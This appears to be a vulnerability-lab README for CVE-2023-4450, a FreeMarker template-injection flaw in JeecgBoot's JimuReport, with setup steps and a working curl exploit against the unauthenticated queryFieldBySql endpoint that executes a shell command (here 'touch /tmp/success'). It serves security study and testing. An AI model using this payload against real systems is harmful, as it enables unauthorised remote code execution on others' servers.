# JeecgBoot JimuReport Template injection (CVE-2023-4450)

[中文版本(Chinese version)](README.zh-cn.md)

JeecgBoot is an open source low-code development platform, Jimureport is one of the low code Report component.

An issue was discovered in Jimureport lower than 1.6. An unauthorized api called `/jmreport/queryFieldBySql` led to remote arbitrary code execution due to parsing SQL statements using Freemarker.

References:

- <https://www.oscs1024.com/hd/MPS-4hzd-mb73>
- <https://www.reajason.eu.org/writing/freemarkersstimemshell>

## Vulnerable Environment

Execute following command to start a JeecgBoot site 3.5.3:

```
docker compose up -d
```

You can access the JimuReport website through `http://your-ip:8080/jeecg-boot/jmreport/list` after the server is started.

## Exploit

send freemarker payload with sql parameter through `http://your-ip:8080/jeecg-boot/jmreport/queryFieldBySql`

```bash
curl --location 'http://your-ip:8080/jeecg-boot/jmreport/queryFieldBySql' \
--header 'Content-Type: application/json' \
--data '{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"touch /tmp/success\")}",
    "type": "0"
}'
```

![](1.png)
